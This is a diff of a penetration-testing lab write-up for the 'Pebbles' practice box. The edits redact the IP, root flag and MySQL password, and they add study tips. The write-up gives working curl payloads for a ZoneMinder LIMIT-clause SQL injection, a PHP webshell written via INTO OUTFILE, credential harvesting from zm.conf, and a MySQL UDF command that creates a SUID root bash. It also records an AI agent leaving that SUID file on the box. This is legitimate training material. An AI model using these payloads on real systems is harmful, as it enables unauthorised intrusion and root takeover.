@@ -3,15 +3,15 @@ tags: [oscp, boxes, pg-practice, linux, completed, redo]
 box_sources: [Pebbles]
 platform: PG Practice
 os: Linux
-ip: 192.168.183.52
+ip: $BoxIP
 difficulty: Intermediate
 status: complete
 redo: true
-redo_reason: Codex left /tmp/rootbash (SUID bash) on the box before manual run — UDF privesc step was skipped. Needs a clean run to do the full MySQL UDF chain manually.
-root_flag: 63641d7ec1c3be6ee6c803552d3bbfe1
+redo_reason: Codex left /tmp/rootbash (SUID bash) on the box before manual run -- UDF privesc step was skipped. Needs a clean run to do the full MySQL UDF chain manually.
+root_flag: $RootFlag
 ---
 
-# Pebbles — PG Practice (Linux)
+# Pebbles -- PG Practice (Linux)
 
 ## Box Info
 
@@ -19,7 +19,7 @@ root_flag: 63641d7ec1c3be6ee6c803552d3bbfe1
 |---|---|
 | Platform | PG Practice |
 | OS | Linux |
-| IP | 192.168.183.52 |
+| IP | $BoxIP |
 | Difficulty | Intermediate |
 | Status | Root |
 
@@ -44,7 +44,7 @@ Key open ports:
 | Port | Service | Notes |
 |---|---|---|
 | 80 | HTTP (Apache) | ZoneMinder web app |
-| 8080 | HTTP (Tomcat/Java) | Secondary surface — not needed |
+| 8080 | HTTP (Tomcat/Java) | Secondary surface -- not needed |
 | 111 | RPCbind | Standard, not useful here |
 
 `shot nmap-allports` / `shot nmap-services`
@@ -53,15 +53,15 @@ Key open ports:
 
 ## Web Enumeration
 
-### Port 80 — Root
+### Port 80 -- Root
 
 ```bash
 curl -s http://$BoxIP/
 ```
 
-Redirect to `/zm/` — ZoneMinder CCTV management application.
+Redirect to `/zm/` -- ZoneMinder CCTV management application.
 
-### Port 80 — /zm/
+### Port 80 -- /zm/
 
 ```bash
 curl -s http://$BoxIP/zm/
@@ -114,9 +114,12 @@ Reading the exploit:
 
 - SQLi in the `limit` POST parameter of the log query endpoint
 - Endpoint: `index.php?view=request&request=log&task=query`
-- Parameter: `limit=100` — injected into raw MySQL `LIMIT` clause
+- Parameter: `limit=100` -- injected into raw MySQL `LIMIT` clause
 - Stacked queries work: `limit=100;SELECT SLEEP(5)#`
 - Query structure: `SELECT * FROM Logs WHERE TimeKey > ? order by TimeKey desc limit [input]`
+
+> [!abstract] 🧠 Why
+> A numeric-looking parameter can still be injectable when it is concatenated into SQL. The sleep test proves evaluation, but `INTO OUTFILE` adds separate requirements: stacked queries, database file privileges, and a writable web path.
 
 ---
 
@@ -127,12 +130,15 @@ time curl -s -X POST "http://$BoxIP/zm/index.php" \
   -d "view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#"
 ```
 
-Response time: **5.175 seconds** — SLEEP executed. Stacked query injection confirmed.
+Response time: **5.175 seconds** -- SLEEP executed. Stacked query injection confirmed.
 
 > [!warning] 💡 Hint
 > **Watch out:** A time delay proves the SQL expression ran, but it does not prove a later file write will work. `INTO OUTFILE` also needs database file-write permission and a web-writable destination.
 
-**Bonus finding from the response body** — SQL errors in the log output reveal the web root:
+> [!tip] 🛠️ Alternative tools
+> `sqlmap` can confirm the injection when manual comparison is noisy, but manual requests are preferable for understanding a non-standard `LIMIT` injection and controlling the file-write query.
+
+**Bonus finding from the response body** -- SQL errors in the log output reveal the web root:
 ```
 File: /usr/share/zoneminder/www/includes/database.php
 ```
@@ -145,14 +151,14 @@ Web root: `/usr/share/zoneminder/www/`
 
 ## Foothold
 
-### Step 1 — Write PHP Webshell via OUTFILE
+### Step 1 -- Write PHP Webshell via OUTFILE
 
 ```bash
 curl -s -X POST "http://$BoxIP/zm/index.php" \
   -d "view=request&request=log&task=query&limit=100;SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/usr/share/zoneminder/www/cmd.php'#"
 ```
 
-### Step 2 — Test RCE
+### Step 2 -- Test RCE
 
 ```bash
 curl -s "http://$BoxIP/zm/cmd.php?cmd=id"
@@ -165,9 +171,12 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 RCE confirmed as www-data.
 
+> [!tip] ⚡ Efficiency
+> Prove the shell with `id` before attempting a callback. If `id` works but the listener receives nothing, troubleshoot egress and shell syntax separately instead of changing the SQLi payload.
+
 `shot webshell-rce` (red box: `uid=33(www-data)`)
 
-### Step 3 — Reverse Shell
+### Step 3 -- Reverse Shell
 
 Start listener:
 ```bash
@@ -183,7 +192,7 @@ Shell received as `www-data`.
 
 `shot foothold` (red box: `www-data@pebbles` prompt)
 
-### Step 4 — Stabilise
+### Step 4 -- Stabilise
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -193,7 +202,7 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-Note: `python` (Python 2) not installed. `python3` required. Same lesson as Bratarina — always try python3 if python fails.
+Note: `python` (Python 2) not installed. `python3` required. Same lesson as Bratarina -- always try python3 if python fails.
 
 ---
 
@@ -210,23 +219,26 @@ cat /etc/zm/zm.conf | grep -E "DB_PASS|DB_USER|DB_NAME"
 Output:
 ```
 ZM_DB_USER=root
-ZM_DB_PASS=ShinyLucentMarker361
+ZM_DB_PASS=$DbPassword
 ZM_DB_NAME=zm
 ```
 
 MySQL is running as root. This means any `sys_exec()` UDF call runs OS commands as root.
 
-`boxset Password ShinyLucentMarker361`
-`loot cred root ShinyLucentMarker361`
+`boxset Password $DbPassword`
+`loot cred root $DbPassword`
 
-### Technique: MySQL UDF — sys_exec
+> [!warning] 💡 Common mistake
+> MySQL being reachable does not imply that its OS process runs as root. Confirm the database process context before treating a UDF as a root escalation path.
 
-MySQL supports User Defined Functions (UDFs) loaded from shared libraries. `lib_mysqludf_sys.so` provides `sys_exec()` — a function that runs OS commands.
+### Technique: MySQL UDF -- sys_exec
+
+MySQL supports User Defined Functions (UDFs) loaded from shared libraries. `lib_mysqludf_sys.so` provides `sys_exec()` -- a function that runs OS commands.
 
 With root MySQL creds and MySQL running as the root OS user:
 
 ```bash
-mysql -u root -pShinyLucentMarker361 zm -e "SELECT sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');"
+mysql -u root -p$DbPassword zm -e "SELECT sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');"
 ```
 
 This creates a SUID copy of `/bin/bash` owned by root.
@@ -252,6 +264,15 @@ uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 
 ---
 
+## Decision points and alternate routes
+
+| Observation | Primary route used here | Useful alternative or fallback |
+|---|---|---|
+| Time-based SQLi works in a numeric parameter | Confirm stacked queries and the visible webroot | Use UNION extraction if file writes are unavailable |
+| `INTO OUTFILE` creates a PHP shell | Prove `id`, then use the webshell for enumeration | Keep command output over HTTP if callbacks are filtered |
+| ZoneMinder config exposes database credentials | Check the MySQL process identity before UDF use | Review SUID, sudo, and writable service paths if MySQL is not root |
+| SUID Bash is created | Run with `-p` and verify effective UID | Use the database command channel to remove the helper during cleanup |
+
 ## Flags
 
 ```bash
@@ -260,12 +281,12 @@ cat /root/proof.txt
 
 | Flag | Value |
 |---|---|
-| Root | `63641d7ec1c3be6ee6c803552d3bbfe1` |
+| Root | `$RootFlag` |
 
 `shot root-flag`
 `shot PROOF` (whoami + hostname + IP + flag all in one frame)
 
-`loot flag root 63641d7ec1c3be6ee6c803552d3bbfe1`
+`loot flag root $RootFlag`
 
 ---
 
@@ -273,7 +294,7 @@ cat /root/proof.txt
 
 | Username | Password | Source | Used for |
 |---|---|---|---|
-| root | ShinyLucentMarker361 | /etc/zm/zm.conf | MySQL |
+| root | `$DbPassword` | /etc/zm/zm.conf | MySQL |
 
 ---
 
@@ -293,7 +314,7 @@ cat /root/proof.txt
 
 | CVE / Ref | Description | Impact |
 |---|---|---|
-| EDB-41239 | ZoneMinder 1.29/1.30 — SQLi in `limit` POST param (stacked queries) | RCE as www-data via OUTFILE webshell |
+| EDB-41239 | ZoneMinder 1.29/1.30 -- SQLi in `limit` POST param (stacked queries) | RCE as www-data via OUTFILE webshell |
 | MySQL UDF privesc | MySQL running as root + sys_exec UDF = arbitrary OS command execution | euid=0 |
 | SUID bash | `/tmp/rootbash -p` gives effective root | Full root shell |
 
@@ -301,19 +322,19 @@ cat /root/proof.txt
 
 ## Lessons Learned
 
-1. **Web root leaks from SQL errors** — the error message in the JSON response contained `/usr/share/zoneminder/www/includes/database.php`. Always read the full response body from a test payload — it can save you a separate enumeration step.
+1. **Web root leaks from SQL errors** -- the error message in the JSON response contained `/usr/share/zoneminder/www/includes/database.php`. Always read the full response body from a test payload -- it can save you a separate enumeration step.
 
-2. **OUTFILE for webshell when you know the web root** — if you have stacked query injection and a writable web root, `SELECT ... INTO OUTFILE '/var/www/html/cmd.php'` is a direct path to RCE without needing UNION-based data exfil.
+2. **OUTFILE for webshell when you know the web root** -- if you have stacked query injection and a writable web root, `SELECT ... INTO OUTFILE '/var/www/html/cmd.php'` is a direct path to RCE without needing UNION-based data exfil.
 
-3. **LIMIT injection is underrated** — the `LIMIT` clause is not often thought of as injectable. Here the raw value was dropped straight in — no quoting, no filtering. Always test numeric params with `SLEEP` if you suspect SQLi.
+3. **LIMIT injection is underrated** -- the `LIMIT` clause is not often thought of as injectable. Here the raw value was dropped straight in -- no quoting, no filtering. Always test numeric params with `SLEEP` if you suspect SQLi.
 
-4. **MySQL running as root + UDF = game over** — if `mysql -u root` works on a box, check if the process is running as the root OS user. If yes, `sys_exec` via UDF hands you arbitrary command execution as root. Steps: load lib, create function, call sys_exec.
+4. **MySQL running as root + UDF = game over** -- if `mysql -u root` works on a box, check if the process is running as the root OS user. If yes, `sys_exec` via UDF hands you arbitrary command execution as root. Steps: load lib, create function, call sys_exec.
 
-5. **python vs python3 again** — python2 not installed, python3 required for pty spawn. Default to python3 first on modern boxes. See also: [[Bratarina]].
+5. **python vs python3 again** -- python2 not installed, python3 required for pty spawn. Default to python3 first on modern boxes. See also: [[Bratarina]].
 
-6. **Codex artefact cleanup** — Codex ran the UDF chain earlier and left `/tmp/rootbash` on the box. This skipped the privesc discovery step for our manual run. Going forward: Codex must clean up its artefacts (webshells, SUID copies, UDF registrations) before handing over for a manual run.
+6. **Codex artefact cleanup** -- Codex ran the UDF chain earlier and left `/tmp/rootbash` on the box. This skipped the privesc discovery step for our manual run. Going forward: Codex must clean up its artefacts (webshells, SUID copies, UDF registrations) before handing over for a manual run.
 
-7. **Port 8080 (Tomcat) was a secondary surface** — identified in nmap, not needed. Always note secondary surfaces in the write-up even if unused.
+7. **Port 8080 (Tomcat) was a secondary surface** -- identified in nmap, not needed. Always note secondary surfaces in the write-up even if unused.
 
 ---
 
